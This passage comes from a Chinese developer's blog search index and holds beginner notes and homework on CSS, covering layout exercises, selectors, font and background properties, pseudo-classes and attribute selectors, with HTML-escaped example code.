1;/*不透明度 0-1之间取值*/&#125; 4.7 兼容性（略）4.8 作业4.8.1 实训一123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./CSS/作业四.css&quot;&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;第四次作业&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;wrapper&quot;&gt; &lt;!--标题部分--&gt; &lt;h1&gt;页面标题&lt;/h1&gt; &lt;!--核心内容--&gt; &lt;div class=&quot;content&quot;&gt; &lt;div class=&quot;aside aside-left&quot;&gt; &lt;!--左侧栏--&gt; &lt;h4&gt;左侧栏&lt;/h4&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接4&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接5&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;!--内容区--&gt; &lt;div class=&quot;main&quot;&gt; &lt;h4&gt;主体内容的标题&lt;/h4&gt; &lt;p&gt;我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物&lt;/p&gt; &lt;p&gt;我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物&lt;/p&gt; &lt;p&gt;我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物&lt;/p&gt; &lt;p&gt;我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物我是废物&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;aside aside-right&quot;&gt; &lt;!--右侧栏--&gt; &lt;h4&gt;右侧栏&lt;/h4&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接4&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接5&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接6&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot; class=&quot;herf&quot;&gt;链接7&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--尾部--&gt; &lt;div class=&quot;footer&quot;&gt;页脚 &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Copy*&#123; margin: 0; padding: 0;&#125;body&#123; padding-top: 10px;&#125;.wrapper&#123;/*内容区一般不给出高度，高度由内容自行撑开.*/ width: 700px; border: 1px solid black; margin: 0 auto;&#125;h1&#123; font-size: 20px; font-family: 黑体; font-weight: normal; background-color: #eee; text-align: center; padding: 20px 0;&#125;.aside&#123; background: url(&quot;../imgs/三国杀二乔.jpg&quot;) repeat-x #8080ff; width: 150px; height: 400px; float: left;&#125;h4&#123; padding: 20px 0 15px 10px;&#125;ul&#123; padding-left: 30px;&#125;li&#123; height: 1.5em; font-size: 14px;&#125;a&#123; text-decoration: none; color: #010101;&#125;a:link&#123; color: black;&#125;a:hover&#123; color: #87faf8;&#125;a:active&#123; color: red;&#125;.main&#123; background: #8080ff url(&quot;../imgs/三国杀夏侯氏.png&quot;) repeat-x; height: 400px; width: 400px; float: left;&#125;.main p&#123; text-indent: 2em; line-height: 1.5em; padding: 10px 20px 10px 10px; font-size: 14px;&#125;.footer&#123; background: #ccc; padding: 20px 0 15px 10px; font-size: 15px;&#125; 4.8.2 实训二123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;第四次作业2&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./CSS/作业四2.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;wrapper&quot;&gt; &lt;!--导航栏--&gt; &lt;div class=&quot;nav&quot;&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;HTML咨询&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;移动互联网&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;应用推荐&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;教程视频&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;资源下载&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;开发工具&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;HTML论坛&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;!--主体部分--&gt; &lt;div class=&quot;content&quot;&gt; &lt;!--左侧内容--&gt; &lt;div class=&quot;article&quot;&gt; &lt;h2&gt;开展党史学习教育的根本遵循&lt;/h2&gt; &lt;h3&gt;开展党史学习教育的根本遵循&lt;/h3&gt; &lt;p&gt;一百年来，我们党团结带领人民接续奋斗，创造了伟大历史，建立了伟大功业，铸就了伟大精神，形成了宝贵经验。在庆祝中国共产党百年华诞的重大时刻和“两个一百年”奋斗目标历史交汇的关键节点，党中央决定在全党开展党史学习教育，要求全党学史明理、学史增信、学史崇德、学史力行，从党的百年伟大奋斗历程中汲取继续前进的智慧和力量。&lt;/p&gt; &lt;p&gt;2021年2月20日上午，党史学习教育动员大会在北京召开。习近平总书记出席会议并发表重要讲话，站在统筹中华民族伟大复兴战略全局和世界百年未有之大变局的时代高度，对开展好党史学习教育作出全面动员和部署：&lt;/p&gt; &lt;p&gt;——用“三个必然要求”深刻阐明开展党史学习教育的重大意义，强调这是牢记初心使命、推进中华民族伟大复兴历史伟业的必然要求，是坚定信仰信念、在新时代坚持和发展中国特色社会主义的必然要求，是推进党的自我革命、永葆党的生机活力的必然要求。&lt;/p&gt; &lt;h3&gt;最生动的教科书&lt;/h3&gt; &lt;p&gt;1844年2月，恩格斯在《德法年鉴》上发表《英国状况——评托马斯·卡莱尔的〈过去和现在〉》一文。在这篇文章中，恩格斯提出一个重要思想，即“历史就是我们的一切”，表现了伟大的马克思主义创始人对“历史的启示”的重视。&lt;/p&gt; &lt;p&gt;注重从历史中总结经验教训，是马克思主义政党的优良传统和独特政治优势。厚重的百年党史中蕴含着丰富的经验和智慧，是我们取之不尽、用之不竭的精神财富和力量源泉，是中国人民和中华民族继往开来、奋勇前进的现实基础。&lt;/p&gt; &lt;p&gt;“党的历史是最生动、最有说服力的教科书。”在这篇重要讲话中，习近平总书记回顾毛泽东、邓小平、江泽民、胡锦涛同志在不同历史时期关于学党史、用党史的重要论述，深刻指出：“我们党历来重视党史学习教育，注重用党的奋斗历程和伟大成就鼓舞斗志、明确方向，用党的光荣传统和优良作风坚定信念、凝聚力量，用党的实践创造和历史经验启迪智慧、砥砺品格。”&lt;/p&gt; &lt;h3&gt;总书记主要从9个方面作出全面梳理和归纳&lt;/h3&gt; &lt;p&gt;第一，“我们党已经发展成为一个走过百年光辉历程、在最大的社会主义国家执政70多年、拥有9100多万党员的世界上最大的马克思主义执政党，中国共产党立志于中华民族千秋伟业，百年恰是风华正茂，要始终站在时代潮流最前列、站在攻坚克难最前沿、站在最广大人民之中，永远立于不败之地”。&lt;/p&gt; &lt;p&gt;第二，“历史是最好的老师，我们党的历史是中国近现代以来历史最为可歌可泣的篇章，历史在人民探索和奋斗中造就了中国共产党，我们党团结带领人民又造就了历史悠久的中华文明新的历史辉煌。一切向前走，都不能忘记走过的路，走得再远、走到再光辉的未来，也不能忘记走过的过去，不能忘记为什么出发”。&lt;/p&gt; &lt;p&gt;第三，“学习党的历史，是坚持和发展中国特色社会主义、把党和国家各项事业继续推向前进的必修课，这门功课不仅必修，而且必须修好”。&lt;/p&gt; &lt;/div&gt; &lt;!--侧栏--&gt; &lt;div class=&quot;asiderbar&quot;&gt; &lt;div class=&quot;aside&quot;&gt; &lt;h2&gt;参考&lt;/h2&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;相关1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;相关2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;相关3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;相关4&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;相关5&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;相关6&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;相关7&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;相关8&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=&quot;aside&quot;&gt; &lt;h2&gt;扩展阅读&lt;/h2&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;扩展1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;扩展2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;扩展3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;扩展4&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;扩展5&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;扩展6&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;扩展7&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;扩展8&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--尾部--&gt; &lt;div class=&quot;footer&quot;&gt; &lt;p&gt;版权声明 &amp;copy;2021&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Copy*&#123; padding: 0; margin: 0;&#125;body&#123; background-color: #f6f6f6; padding-top: 10px; font-size: 12px;&#125;.wrapper&#123; width: 800px; margin: 0 auto; background-color: #fff; border:1px solid #ccc; overflow: hidden;/*一定要清除浮动*/&#125;.nav&#123; background-color: dodgerblue;&#125;.nav ul&#123; list-style: none; padding: 8px 0 8px 20px;&#125;.nav li&#123; display: inline-block;/*非常灵性的操作*/ margin: 0 12px;&#125;.nav a&#123; text-decoration: none; color: white; font-weight: bold;&#125;.nav a:hover&#123; color: #8080ff;&#125;.nav a:active&#123; color: red;&#125;.content&#123; overflow: hidden;&#125;.article&#123; padding: 5px 10px 5px 15px; border-right: 1px dotted #ccc;/*添加单侧边框*/ width: 520px; float: left;&#125;.article h2&#123; text-align: center; font-size: 26px; margin: 30px 0 20px; font-family: 黑体;&#125;.article h3&#123; font-size: 15px; font-family: 微软雅黑; text-indent: 2em; margin: 20px 0 10px; font-weight: bold;&#125;p&#123; text-indent: 2em; margin: 10px 0;&#125;.asiderbar&#123; float: right; width: 240px; margin: 85px 0 0 10px;&#125;.aside&#123; margin-bottom: 10px; border-left: 1px solid #ccc; border-bottom: 1px solid #ccc;&#125;.asiderbar h2&#123; background-color: deepskyblue; font-size: 12px; color: #f5f5f5; padding: 5px 0 5px 10px;&#125;.aside ul&#123; margin-left: 30px;&#125;.aside li&#123; margin: 8px 0;&#125;.aside a&#123; color: black; text-decoration: none;&#125;.aside a:hover&#123; color: #87faf8; text-decoration: underline purple;&#125;.aside a:active&#123; color: red;&#125;.footer p&#123; background-color: mediumpurple; color: white; padding: 8px 0 8px 15px; margin-bottom: 20px;&#125;","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/CSS/"}]},{"title":"CSS基础","slug":"前端学习6","date":"2021-03-15T06:27:31.000Z","updated":"2021-05-23T07:42:56.102Z","comments":true,"path":"2021/03/15/前端学习6/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/03/15/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A06/","excerpt":"","text":"第三章 CSS基础课程提要 CSS介绍 CSS字体 CSS背景 CSS伪选择器 CSS属性&amp;&amp;关系选择器 CSS伪元素 3.1CSS介绍层叠样式表（CSS），又称串样式列表，由W3C定义维护，一种用来结构化文档（HTML文档或者XML应用）添加样式（字体、间距和颜色等）的计算机语言。 CSS能对网页中元素位置的排版进行像素级精确控制，几乎所有字体字号样式，拥有对网页对象和模型样式编辑的能力。 3.1.1 CSS的使用使用CSS可以让结构（HTM）与表现（CSS）分离，方便维护。 过去我们写网站都用table来布局，然后样式都直接加在table上面，这样一来页面显得特别臃肿，然后想修改一下也显得十分困难。 后来W3C推出了CSS，把结构和样式分离，HTML只负责结构，样式交给CSS来实现。这样一来，开发者工作量和效率大大提升，页面维护也变得容易，想要修改某个字体或者样式，直接在CSS文件中修改，不需要修改HTML结构。 3.1.2 CSS基本语法123选择器&#123; 属性:属性值;&#125; 3.1.3 CSS的四种引用方式CSS引用方式：行间样式、内部样式、外部样式、导入外部样式。 行间样式（嵌入式样式）：直接在标签上书写样式。 内部样式：在文件内部书写样式。 123&lt;style&gt; 样式内容&lt;/style&gt; 外部样式：先创建一个CSS文件，再用link标签引入文件。 导入外部样式：先创建一个CSS文件，在style标签中使用import导入这个样式文件。 以上四种CSS引用区别： 行间样式只作用于当前标签；而内部样式只作用于当前文件；外部样式可以被多个HTML文件引用。 在实际开发中，最好使用外部样式（link使用更多）。 外部样式分为link引入和import引入两种方式。区别： link是XHTML标签，除了加载CSS以外，还可以定义RSS等其他事物；@import属于CSS范畴，只能加载CSS。 link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入后加载。 link是XHTML标签，无兼容性问题；@import是在CSS2.1提出，低版本浏览器不支持。 link支持使用Javascript控制DOM去改变样式；而@import不支持。 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS的四种引用方式&lt;/title&gt; &lt;!--引入外部样式文件--&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;CSS/201.1.css&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; /*导入外部样式*/ @import &quot;CSS/201.2.css&quot;; p&#123; background-color: #eeeeee; font-size:18px; font-style:italic; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;!--1.行间样式--&gt; &lt;div style=&quot;color:olive;width:100px;border:1px solid blue;&quot;&gt;行间样式测试1&lt;/div&gt; &lt;div&gt;行间样式测试1&lt;/div&gt; &lt;!--2.内部样式表（见head部分）--&gt; &lt;p&gt;段落一&lt;/p&gt; &lt;p&gt;段落二&lt;/p&gt; &lt;!--3.外部样式--&gt; &lt;span&gt;外部样式测试&lt;/span&gt; &lt;span&gt;外部样式测试&lt;/span&gt; &lt;span&gt;外部样式测试&lt;/span&gt; &lt;span&gt;外部样式测试&lt;/span&gt; &lt;!--3.导入外部样式--&gt; &lt;div class=&quot;box&quot;&gt;导入外部样式&lt;/div&gt; &lt;div class=&quot;box&quot;&gt;导入外部样式&lt;/div&gt; &lt;div class=&quot;box&quot;&gt;导入外部样式&lt;/div&gt; &lt;em class=&quot;box&quot;&gt;你好鸭&lt;/em&gt;&lt;/body&gt;&lt;/html&gt; 3.1.4 CSS选择器1）*：匹配HTML中所有元素 ​ 注意：*的性能很差，因为要匹配所有元素，所以开发时不建议使用。 2）标签选择器：用来匹配对应的标签。 3）类选择器：用来匹配class命名的标签元素。 4）ID选择器：用来选择用id命名的标签。 5）派出选择器：根据上下文来确定选择的标签。 6）伪类选择器：后续讲 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;css选择器&lt;/title&gt; &lt;style&gt; /*!*1.* *!*/ /**&#123;*/ /* color: red;*/ /*&#125;*/ /*2.标签选择器*/ span&#123; display: block; margin-right: 20px; border: 1px solid gray; &#125; /*3.类选择器*/ .wrapper&#123; color: #87faf8; &#125; /*4.ID选择器*/ #content&#123; color: pink; &#125; /*5.派出选择器*/ .box2 li&#123; color: blue; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;!--1.*--&gt; &lt;p&gt;这是P标签&lt;/p&gt; &lt;strong&gt;这是strong标签&lt;/strong&gt; &lt;!--2.标签选择器--&gt; &lt;span&gt;这是span标签&lt;/span&gt; &lt;div&gt;这是div标签&lt;/div&gt; &lt;div class=&quot;wrapper&quot;&gt;这是div标签&lt;/div&gt; &lt;p id=&quot;content&quot;&gt;这是一个段落&lt;/p&gt; &lt;ul class=&quot;box1&quot;&gt; &lt;li&gt;bilibili1&lt;/li&gt; &lt;li&gt;bilibili2&lt;/li&gt; &lt;li&gt;bilibili3&lt;/li&gt; &lt;li&gt;bilibili4&lt;/li&gt; &lt;/ul&gt; &lt;ul class=&quot;box2&quot;&gt; &lt;li&gt;bilibili1&lt;/li&gt; &lt;li&gt;bilibili2&lt;/li&gt; &lt;li&gt;bilibili3&lt;/li&gt; &lt;ul&gt; &lt;li&gt;haha1&lt;/li&gt; &lt;li&gt;haha2&lt;/li&gt; &lt;li&gt;haha3&lt;/li&gt; &lt;/ul&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 3.1.5 选择器分组对多个选择器进行分组，这样， 被分组的选择器就可以共享相同的声明。用逗号将需要的分组选择器分开。一般用于设置公共样式。 3.1.6 选择器继承子元素可以继承元素的样式，反之不可以。 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;选择器分组和样式继承&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*分组操作*/ h1,.box,p&#123; color: red; &#125; p&#123; width:100px; background-color: #999999; color:blue; &#125; /*样式继承*/ .test&#123; font-size: 18px; &#125; .test span&#123; font-weight: bold; font-size: 28px;/*改写父元素传入的样式*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;h1&lt;/h1&gt; &lt;div class=&quot;box&quot;&gt; box内容&lt;/div&gt; &lt;p&gt;p&lt;/p&gt; &lt;div class=&quot;test&quot;&gt;这是一段测试&lt;span&gt;内容&lt;/span&gt;。&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 3.1.7 优先级样式权重： !important(10000)&gt;内联样式（1000）&gt;ID选择器（100）&gt;类、伪类选择器（10）&gt;标签选择器（1） 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;样式权重&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; p&#123; color:blue/*!important*/; &#125; #content div.main_content h2&#123;/*权重：100+1+10+1*/ color: red; &#125; #content .main_content h2&#123;/*权重：100+1+10*/ color:blue; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p style=&quot;color:red;&quot;&gt;这是内容1&lt;/p&gt; &lt;p&gt;这是内容2&lt;/p&gt; &lt;!--内联样式权重大于标签选择器--&gt; &lt;div id=&quot;content&quot;&gt; &lt;div class=&quot;main_content&quot;&gt; 52 &lt;h2&gt; 这是一个标题 &lt;/h2&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 3.2 CSS字体 font-size：字号 属性值 {number+px}：固定尺寸像素 {number+%}：其百分比取值是基于父对象的尺寸大小 font-family：字体 属性值 name：字体名称，按优先顺序排列，以逗号隔开。若字体名称包含空格，则应该使用引号括起来。 font-style：样式 属性值 normal：默认值。正常字体。 italic：斜体，对于没有斜体变量的特殊字体，将应用oblique。 oblique：倾斜的字体。 font-weight：加粗 属性值 normal：默认值，正常字体。 bold：加粗。 bolder：比bold更粗。 lighter：比normal细。 {100-900}：定义粗到细的字符。400=normal，700=bold。 line-height：行高，字体底端与字体内部顶端之间的距离。 属性值 normal：默认行高，默认值。 {normal+px}：指定行高为长度像素。 {number}：指定行高为字体大小的倍数。 color：文字颜色 属性值 name：颜色名称指定color。 rgb：指定颜色为RGB。（0-255，三个分量） {颜色十六进制}：指定颜色为16进制。（#开头，后跟六位（#rrggbb）或者三位（#rgb） text-decoration：文字修饰 属性值 normal：默认值，无修饰。 underline：下划线。 line-through：贯穿线。 overline：上划线。 text-align：文本对齐方式 属性值 left：默认值，左对齐。 center：居中对齐。 right：右对齐。 text-transform：字母大小写 none：默认值。 capitalize：将单词第一个字母转换成大写。 uppercase：所有文字转换成大写。 lowercase：所有文字转换成小写。 text-indent：文本缩进 属性值 {number+px}：首行缩进number像素。 {number+em}：首行缩进number个字符。 font复合属性： 1font:font-style font-variant font-weight font-size/line-height font-family; 1）注意属性值的位置顺序。 2）除了font-size和font-family，其他任何一个属性值都可以省略。 3）font-variant：文本修饰，normal/small-caps（让大写字母变得小一些） 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS字体属性&lt;/title&gt; &lt;style&gt; p&#123; font-size: 28px; font-family: 微软雅黑, 宋体, 黑体; /*font-style: italic;*/ font-weight: 300; line-height: 2; color: #808011; text-align: center; text-transform: capitalize; text-indent: 2em; &#125; p span&#123; font-weight: 900; /*color: #87faf8;*/ color: rgb(122,135,255); text-decoration: underline; /*text-decoration: line-through;*/ &#125; strong &#123; font: italic small-caps bolder 8px/2 微软雅黑; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;中国沙尘暴主要发生在春季的3月～5月。 中国工程院院士、中国气象科学研究院研究员张小曳向 &lt;span&gt;《中国新闻周刊》&lt;/span&gt;介绍，这次沙尘暴的起源， 主要是在蒙古国戈壁沙漠的中部和南部，以及内蒙古的中部和西部沙漠。 此次沙尘暴基本上朝东移动，未来主要影响的是长江以北地区， 包括辽宁、河北、河南、山东，以及江苏部分地区， 3月16日，沙尘暴将影响到上海。今日傍晚，此次沙尘暴对北京的影响将会结束。 &lt;/p&gt; &lt;p&gt;text-decoration: line-through&lt;/p&gt; &lt;strong&gt;辽宁、河北、河南、山东 hello&lt;/strong&gt;&lt;/body&gt;&lt;/html&gt; 3.3 CSS背景1）background-color：背景色（transparent/一种颜色） 2）background-image：背景图 none url{url}(使用绝对或者相对url指定背景图片) 3）background-repeat:设置对象的背景图铺排方式 repeat：默认值（背景图像在纵向和横向平铺） no-repeat：背景图像不平铺 repeat-x：背景图像仅在横向平铺 repeat-y：背景图像仅在纵向平铺 4）background-position：背景图像位置 {x-number|top|center|bottom} {y-number|left|right|center} 5）background-attachment：设置背景图像滚动的位置 scroll：默认值，背景图像会随着页面其余部分的滚动而滚动。 fixed：当页面的其余部分滚动时，背景图像不会移动。 6）background复合属性：设置背景的复合写法 顺序：背景色 图片url 是否平铺 是否固定滚动条 百分比 位置 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS背景&lt;/title&gt; &lt;style&gt; /*body&#123;*/ /* !*background-color: rgb(125,125,255);*!*/ /* background-image: url(https://s3.ax1x.com/2021/03/15/6Dxmyn.gif);*/ /* background-repeat: no-repeat;*/ /* background-position: top; !*如果只带一个参数，默认y方向为50%*!*/ /* background-attachment: fixed;!*scroll*!*/ /* height: 2000px;*/ /*&#125;*/ body&#123; background: #888888 url(https://s3.ax1x.com/2021/03/15/6Dxmyn.gif) repeat-y scroll 100px 200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 3.4 CSS伪类选择器伪类：专门用来表示元素的一种特殊状态。 常用的伪类选择器： a标签的伪类： a:visited：已被访问状态 a:link：未访问状态 a:hover：鼠标悬停状态 a:active：用户激活 表单（:foucs）：表单获得焦点时的触发样式。 first-child：（:first-child/:last-child/nth-child(num)伪类来选择元素的第一个/最后/中间某个子元素）。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS伪类选择器&lt;/title&gt; &lt;style&gt; a:link&#123; /*link可以不写*/ color: red; &#125; a:visited&#123; color:green; &#125; a:hover&#123; color: #8080ff; &#125; a:active&#123; color:deepskyblue; &#125; input:focus&#123; outline: 1px solid red; &#125; ul li:first-child&#123; color: yellow; &#125; ul li:nth-child(3)&#123; color: #8080ff; &#125; ul li:last-child&#123; color:pink; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;!----&gt; &lt;a href=&quot;#&quot;&gt;单机我跳转&lt;/a&gt; &lt;input type=&quot;text&quot;&gt; &lt;ul&gt; &lt;li&gt;num1&lt;/li&gt; &lt;li&gt;num2&lt;/li&gt; &lt;li&gt;num3&lt;/li&gt; &lt;li&gt;num4&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 3.5 属性和关系选择器3.5.1 属性选择器 [属性名]：包含有指定属性名的元素 [属性名=值]：属性名的值为指定值的元素 [属性名~=值]：属性名的值包含指定值得到元素 [属性名^=值]：属性名的值以指定值开头的元素 [属性名$=值]：属性名的值以指定值结尾的元素 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;属性选择器&lt;/title&gt;&lt;/head&gt;&lt;style&gt; div.content[title]&#123; font-weight: bolder; &#125; input[name=&quot;usr&quot;]&#123; background-color: #8080ff; &#125; div[class^=box4]&#123; background-color: #809999; &#125; div[class~=box1]&#123; background-color: #808000; &#125; div[class$=box6]&#123; background-color: #ff8070; &#125;&lt;/style&gt;&lt;body&gt;&lt;div class=&quot;content box1 box2&quot; title=&quot;内容&quot;&gt;content1&lt;/div&gt;&lt;div class=&quot;box4 box2&quot;&gt;content2&lt;/div&gt;&lt;div class=&quot;content box3 box6&quot;&gt;content3&lt;/div&gt;&lt;form action=&quot;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;usr&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;account&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 3.5.2 关系选择器1）空格：后代选择器 2）&gt;：只选择儿子元素 3）+：兄弟选择器 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;关系选择器&lt;/title&gt; &lt;style&gt; /*!*后代选择器*!*/ /*h1 strong&#123;*/ /* background-color: #000;*/ /* color:#fff;*/ /*&#125;*/ /*儿子选择器*/ h1&gt;strong&#123; background-color: #000; color:#fff; &#125; /*兄弟选择器*/ ul li+li+li&#123; color: #8080ff; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&lt;strong&gt;关系一&lt;/strong&gt;&lt;span&gt;&lt;strong&gt;关系二&lt;/strong&gt;&lt;/span&gt;&lt;/h1&gt;&lt;ul&gt; &lt;li&gt;内容1&lt;/li&gt; &lt;li&gt;内容2&lt;/li&gt; &lt;li&gt;内容3&lt;/li&gt; &lt;li&gt;内容4&lt;/li&gt; 